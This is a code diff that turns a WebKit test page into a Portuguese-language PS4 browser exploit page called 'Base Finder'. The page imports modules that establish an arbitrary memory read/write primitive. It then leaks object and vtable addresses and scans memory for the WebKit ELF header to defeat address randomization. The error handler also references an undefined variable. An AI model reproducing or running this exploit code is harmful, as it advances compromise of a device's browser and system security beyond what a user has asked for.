@@ -1,7 +1,266 @@
-
 <!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PS4 WebKit — Base Finder</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body {
+    height: 100%;
+    background: #0b0f19;
+    color: #c8ced8;
+    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
+    display: flex; flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    gap: 14px;
+    padding: 20px;
+  }
+  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
+  #status {
+    font-size: 20px; font-weight: 700; color: #fff;
+    min-height: 1.5em;
+    text-align: center;
+  }
+  #log {
+    width: 95%; max-width: 900px; height: 520px;
+    background: #111827; border: 1px solid #1f2937;
+    border-radius: 10px; padding: 14px 16px;
+    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
+    font-size: 12px; color: #9fb1c3;
+    white-space: pre-wrap; word-break: break-all;
+    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
+  }
+  #log .ok { color: #4ade80; }
+  #log .err { color: #f87171; }
+  #log .info { color: #60a5fa; }
+  #log .warn { color: #fbbf24; }
+  #actions {
+    display: flex; gap: 12px; flex-wrap: wrap;
+    justify-content: center;
+  }
+  button {
+    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 12px; color: #fff;
+    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
+    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
+    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
+    cursor: pointer; transition: all .12s ease;
+  }
+  button:hover { transform: translateY(-2px); }
+  button:active { transform: translateY(1px); }
+  button:disabled {
+    opacity: 0.45; cursor: not-allowed; transform: none;
+    background: #374151; box-shadow: none;
+  }
+</style>
+</head>
 <body>
-<script src="lazy-shadow-tree-creation.js"></script>
-<script>
-run({ useParser: true });
+
+<h1>PS4 WebKit — Base Finder (Safe)</h1>
+<div id="status">Inicializando...</div>
+<div id="log"></div>
+<div id="actions">
+  <button id="btnFind" disabled>Find Base</button>
+  <button id="btnInfo" disabled>Show Info</button>
+  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
+</div>
+
+<script type="module">
+  import { establishPrimitive } from "./resources/core.js";
+  import { installWindowP } from "./resources/mem.js";
+  import { int64 } from "./resources/int64.js";
+
+  const status = document.getElementById("status");
+  const logBox = document.getElementById("log");
+  const btnFind = document.getElementById("btnFind");
+  const btnInfo = document.getElementById("btnInfo");
+
+  function log(msg, cls = "info") {
+    const line = document.createElement("div");
+    line.className = cls;
+    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    logBox.appendChild(line);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+
+  window.clearLog = function() {
+    logBox.innerHTML = "";
+  };
+
+  function onCoreEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
+
+  function onMemEvent(tag, detail) {
+    log(`${tag}: ${detail}`, "info");
+  }
+
+  // Safe read4
+  function safeRead4(p, addr) {
+    try { return p.read4(addr); } catch (e) { return null; }
+  }
+
+  // ========== SHOW INFO ==========
+  window.showInfo = function() {
+    const p = window.p;
+    if (!p) { log("window.p não disponível", "err"); return; }
+
+    log("=== INFO ===", "ok");
+    log(`User-Agent: ${navigator.userAgent}`, "info");
+
+    let ctor = globalThis.__ps5NativeCtor;
+    if (ctor) {
+      log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
+      window.__ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
+    }
+
+    let textarea = document.createElement("textarea");
+    let textAddr = p.leakval(textarea);
+    let vtablePtr = p.read8(textAddr.add32(0x18));
+    let e0 = p.read8(vtablePtr);
+    log(`vtable[0] = 0x${e0.toString(16)}`, "info");
+
+    // Calculate delta
+    if (window.__ctorAddr) {
+      let delta = e0.sub32(window.__ctorAddr.low);
+      log(`Delta vtable[0] - ctor = 0x${(e0.low - window.__ctorAddr.low).toString(16)}`, "info");
+    }
+  };
+
+  // ========== FIND BASE ==========
+  window.findBase = function() {
+    const p = window.p;
+    if (!p) { log("window.p não disponível", "err"); return; }
+
+    let ctor = globalThis.__ps5NativeCtor;
+    if (!ctor) { log("__ps5NativeCtor not available", "err"); return; }
+
+    let ctorAddr = new int64(ctor % 0x100000000, Math.floor(ctor / 0x100000000));
+    log(`__ps5NativeCtor = 0x${ctorAddr.toString(16)}`, "ok");
+
+    // Chutes razoáveis: o módulo WebKit tem 20-60MB.
+    // Vamos testar bases a 8MB, 16MB, 24MB, 32MB, 40MB, 48MB do ctor
+    let guesses = [
+      0x00800000,  // 8MB
+      0x01000000,  // 16MB
+      0x01800000,  // 24MB
+      0x02000000,  // 32MB
+      0x02800000,  // 40MB
+      0x03000000,  // 48MB
+      0x03800000,  // 56MB
+    ];
+
+    log("Testing base guesses (1MB scan each, 0x4000 steps)...", "info");
+
+    for (let guessOffset of guesses) {
+      let guessBase = new int64(
+        (ctor - guessOffset) % 0x100000000,
+        Math.floor((ctor - guessOffset) / 0x100000000)
+      );
+      // Align to 0x4000
+      let alignedLow = guessBase.low & 0xFFFFC000;
+      let aligned = new int64(alignedLow, guessBase.hi);
+
+      log(`Trying base ~ 0x${aligned.toString(16)} (offset -0x${guessOffset.toString(16)})`, "info");
+
+      // Scan 1MB forward from guess
+      let found = false;
+      for (let i = 0; i < 64; i++) { // 64 * 0x4000 = 1MB
+        let candidate = aligned.add32(i * 0x4000);
+        let magic = safeRead4(p, candidate);
+        if (magic === 0x464c457f) {
+          log(`  ELF FOUND @ 0x${candidate.toString(16)} !!!`, "ok");
+          window.__webkitBase = candidate;
+          found = true;
+
+          // Quick validation: read e_ident
+          let eiClass = p.read1(candidate.add32(4));
+          let eiData = p.read1(candidate.add32(5));
+          log(`  ELF class=${eiClass} data=${eiData}`, "ok");
+
+          // Dump header hex
+          let hex = "";
+          for (let j = 0; j < 0x40; j += 4) {
+            hex += p.read4(candidate.add32(j)).toString(16).padStart(8, '0') + " ";
+          }
+          log(`  Header: ${hex}`, "info");
+
+          // Calculate exact offset of __ps5NativeCtor
+          let ctorOffset = ctorAddr.sub32(candidate.low);
+          log(`  __ps5NativeCtor offset = 0x${ctorOffset.low.toString(16)}`, "ok");
+
+          break;
+        }
+      }
+      if (found) break;
+
+      // Also try 1MB backward (in case we overshot)
+      for (let i = 1; i <= 64; i++) {
+        let candidate = aligned.sub32(i * 0x4000);
+        // Don't go below 0x800000000
+        if (candidate.hi < 0x8) break;
+        let magic = safeRead4(p, candidate);
+        if (magic === 0x464c457f) {
+          log(`  ELF FOUND (backward) @ 0x${candidate.toString(16)} !!!`, "ok");
+          window.__webkitBase = candidate;
+          found = true;
+          break;
+        }
+      }
+      if (found) break;
+    }
+
+    if (!window.__webkitBase) {
+      log("ELF not found in any guess range.", "err");
+      log("The module might be mapped at an unusual address.", "warn");
+      log("Alternative: use nm/objdump on libSceWebKit2 binary.", "warn");
+    }
+  };
+
+  btnFind.onclick = window.findBase;
+  btnInfo.onclick = window.showInfo;
+
+  // ========== BOOTSTRAP ==========
+  log("Carregando módulos...", "ok");
+  status.textContent = "Executando exploit...";
+
+  establishPrimitive({ onEvent: onCoreEvent })
+    .then(carrier => {
+      log("Core: primitivo estabelecido", "ok");
+      log(`Tentativas: ${carrier.attempts}`, "info");
+
+      const prim = installWindowP(carrier, {
+        onEvent: onMemEvent,
+        promote: true
+      });
+
+      log("Mem: real pair ativo", "ok");
+      log("window.p está disponível", "ok");
+
+      window.__carrier = carrier;
+      window.__prim = prim;
+      window.int64 = int64;
+
+      status.textContent = "RW Primitivo OK";
+      status.style.color = "#4ade80";
+      btnFind.disabled = false;
+      btnInfo.disabled = false;
+
+      try {
+        const testAddr = prim.leakval(prim);
+        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
+      } catch (e) {
+        log(`Sanity leak falhou: ${e.message}`, "err");
+      }
+    })
+    .catch(err => {
+      log(`FALHA: ${err.name}: ${e.message}`, "err");
+      status.textContent = "Falha no exploit";
+      status.style.color = "#f87171";
+    });
 </script>
+
+</body>
+</html>
